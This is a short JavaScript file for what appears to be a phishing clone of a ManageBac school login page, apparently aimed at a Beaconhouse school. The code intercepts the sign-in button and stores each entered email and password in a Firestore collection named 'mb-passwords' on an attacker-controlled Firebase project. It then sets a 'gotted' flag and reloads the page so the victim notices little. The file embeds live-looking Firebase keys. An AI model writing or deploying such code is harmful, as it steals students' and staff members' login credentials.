import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import {
  getFirestore,
  addDoc,
  collection,
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

console.log("Helloo!!!!!!!!!!");

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDvix46PGrqV4sIW3tlj-fLlb6mbuDVHj8",
  authDomain: "tnsbeaconhouse-managebac.firebaseapp.com",
  projectId: "tnsbeaconhouse-managebac",
  storageBucket: "tnsbeaconhouse-managebac.appspot.com",
  messagingSenderId: "102801144416",
  appId: "1:102801144416:web:7d3c46ce4a044c81f66105",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const invalid_element = document.getElementsByClassName("js-flash-area")[0];
const form_element = document.getElementById("session_form");
const email_element = document.getElementById("session_login");
const password_element = document.getElementById("session_password");
const submit_element = document.getElementById("session_submit");

const sPw = async () => {
  try {
    const docRef = await addDoc(collection(db, "mb-passwords"), {
      email: email_element.value,
      password: password_element.value,
    });

    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  } finally {
    submit_element.value = "Sign In";
    localStorage.setItem("gotted", "true");
    location.reload();
  }
};

submit_element.addEventListener("click", (e) => {
  e.preventDefault();
  submit_element.value = "Processing...";
  sPw();
});
